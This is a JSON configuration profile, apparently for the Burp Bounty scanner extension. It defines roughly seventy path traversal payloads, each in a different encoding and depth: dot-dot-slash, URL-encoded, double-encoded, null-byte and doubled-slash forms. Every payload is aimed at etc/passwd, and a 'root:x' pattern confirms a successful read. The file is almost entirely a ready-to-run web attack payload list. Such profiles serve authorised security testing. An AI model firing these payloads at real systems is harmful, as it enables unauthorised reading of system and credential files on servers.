[
  {
    "ProfileName": "Linux-Path",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@Sy3Omda",
    "Payloads": [
      "true,..%5c..%5c{FILE}",
      "true,..%5c..%5c..%5c{FILE}",
      "true,..%5c..%5c..%5c..%5c{FILE}",
      "true,..%5c..%5c..%5c..%5c..%5c{FILE}",
      "true,..%5c..%5c..%5c..%5c..%5c..%5c{FILE}",
      "true,..%252f{FILE}",
      "true,..%252f..%252f{FILE}",
      "true,..%252f..%252f..%252f{FILE}",
      "true,..%252f..%252f..%252f..%252f{FILE}",
      "true,./../{FILE}",
      "true,./.././../{FILE}",
      "true,./.././.././.././../{FILE}",
      "true,./.././.././.././.././../{FILE}",
      "true,..///{FILE}",
      "true,..///..///{FILE}",
      "true,..///..///..///{FILE}",
      "true,..///..///..///..///{FILE}",
      "true,..///..///..///..///..///{FILE}",
      "true,..//{FILE}",
      "true,..//..//{FILE}",
      "true,..//..//..//{FILE}",
      "true,..//..//..//..//{FILE}",
      "true,..//..//..//..//..//{FILE}",
      "true,../{FILE}",
      "true,../../{FILE}",
      "true,../../../{FILE}",
      "true,../../../../{FILE}",
      "true,../../../../../{FILE}",
      "true,../{FILE}%00",
      "true,../../{FILE}%00",
      "true,../../../{FILE}%00",
      "true,../../../../{FILE}%00",
      "true,../../../../../{FILE}%00",
      "true,....//{FILE}",
      "true,....//....//{FILE}",
      "true,....//....//....//{FILE}",
      "true,....//....//....//....//{FILE}",
      "true,....//....//....//....//....//{FILE}",
      "true,....%2F%2F{FILE}",
      "true,....%2F%2F....%2F%2F{FILE}",
      "true,....%2F%2F....%2F%2F....%2F%2F{FILE}",
      "true,....%2F%2F....%2F%2F....%2F%2F....%2F%2F{FILE}",
      "true,....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F{FILE}",
      "true,....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F{FILE}",
      "true,..%2f{FILE}",
      "true,..%2f..%2f{FILE}",
      "true,..%2f..%2f..%2f{FILE}",
      "true,..%2f..%2f..%2f..%2f{FILE}",
      "true,..%2f..%2f..%2f..%2f..%2f{FILE}",
      "true,..%%32%66{FILE}",
      "true,..%%32%66..%%32%66{FILE}",
      "true,..%%32%66..%%32%66..%%32%66{FILE}",
      "true,..%%32%66..%%32%66..%%32%66..%%32%66{FILE}",
      "true,..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}",
      "true,%2e%2e/{FILE}",
      "true,%2e%2e/%2e%2e/{FILE}",
      "true,%2e%2e/%2e%2e/%2e%2e/{FILE}",
      "true,%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}",
      "true,%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}",
      "true,%252e%252e/{FILE}",
      "true,%252e%252e/%252e%252e/{FILE}",
      "true,%252e%252e/%252e%252e/%252e%252e/{FILE}",
      "true,%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}",
      "true,%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}",
      "true,%%32%65%%32%65/{FILE}",
      "true,%%32%65%%32%65/%%32%65%%32%65/{FILE}",
      "true,%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}",
      "true,%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}",
      "true,%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}"
    ],
    "Encoder": [],
    "UrlEncode": false,
    "CharsToUrlEncode": "",
    "Grep": [
      "true,,*root:x*"
    ],
    "Tags": [
      "PathTraversal",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 2,
    "Scope": 0,
    "RedirType": 0,
    "MaxRedir": 0,
    "payloadPosition": 1,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "Linux-Path",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "Path traversal with payloads: \u003cbr\u003e \u003cpayload\u003e",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [
      {
        "type": "Payload",
        "match": "{FILE}",
        "replace": "etc/passwd",
        "regex": "String"
      }
    ],
    "VariationAttributes": [],
    "InsertionPointType": [
      32,
      0,
      37
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]